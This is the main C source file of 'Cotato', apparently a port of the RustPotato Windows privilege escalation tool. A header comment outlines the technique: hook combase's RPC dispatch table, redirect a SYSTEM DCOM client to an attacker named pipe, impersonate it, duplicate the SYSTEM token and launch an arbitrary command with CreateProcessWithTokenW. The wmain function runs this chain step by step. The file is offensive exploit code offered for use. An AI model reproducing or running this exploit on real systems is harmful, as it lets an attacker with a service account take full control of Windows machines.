/*
 * Cotato - C port of RustPotato
 *
 *  1. Find combase.dll in the PEB module list
 *  2. Scan its image for the RPC_SERVER_INTERFACE matching ORCB GUID
 *  3. Hook the first entry in MIDL dispatch table -> our UseProtseq shim
 *     that redirects RPC to our named pipe
 *  4. Create the named pipe, wait for the SYSTEM DCOM client to connect
 *  5. ImpersonateNamedPipeClient -> iterate process tokens -> find S-1-5-18
 *  6. DuplicateToken + CreateProcessWithTokenW to run arbitrary command
 *
 * NT API functions are resolved via GetModuleHandleA / GetProcAddress only.
 * No direct syscalls.
 */

#include "../includes/resolve.h"
#include "../includes/hook.h"
#include "../includes/pipe.h"
#include "../includes/objref.h"
#include "../includes/exec.h"

int wmain(int argc, wchar_t *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %ls <command>\n", argv[0]);
        fprintf(stderr, "  e.g.: %ls \"cmd.exe /c whoami\"\n", argv[0]);
        return 1;
    }

    printf("[*] Cotato – command: %ls\n\n", argv[1]);

    if (!ResolveApis())   return 1;
    if (!ResolveCOMApis()) return 1;

    printf("\n[+] INITIALIZE CONTEXT\n");
    if (!InitContext()) return 1;

    printf("\n[+] INSTALL HOOK\n");
    if (!HookRpc()) return 1;

    printf("\n[+] START PIPE SERVER\n");
    PIPE_CTX pipeCtx = {0};
    lstrcpyW(pipeCtx.PipeName, L"\\\\.\\pipe\\Cotato\\pipe\\epmapper");
    pipeCtx.hReady = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!pipeCtx.hReady) { RestoreRpc(); return 1; }

    HANDLE hThread = CreateThread(NULL, 0, PipeServerThread, &pipeCtx, 0, NULL);
    if (!hThread) {
        fprintf(stderr, "[-] CreateThread failed: %lu\n", GetLastError());
        RestoreRpc();
        return 1;
    }

    printf("\n[+] TRIGGER DCOM UNMARSHAL\n");
    TriggerUnmarshal();

    printf("\n[+] Waiting for SYSTEM token (10s timeout)...\n");
    WaitForSingleObject(pipeCtx.hReady, 10000);

    printf("\n[+] RESTORE HOOK\n");
    RestoreRpc();

    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);
    CloseHandle(pipeCtx.hReady);

    if (!pipeCtx.hSystemToken) {
        fprintf(stderr, "[-] Failed to obtain SYSTEM token\n");
        return 1;
    }

    printf("\n[+] EXECUTE COMMAND\n");
    /* Enable required privileges before CreateProcessWithTokenW */
    EnablePrivilege(SE_IMPERSONATE_NAME);
    EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);
    EnablePrivilege(SE_INCREASE_QUOTA_NAME);
    ExecuteCommand(pipeCtx.hSystemToken, argv[1]);

    _NtClose(pipeCtx.hSystemToken);
    printf("\n[*] Done.\n");
    return 0;
}

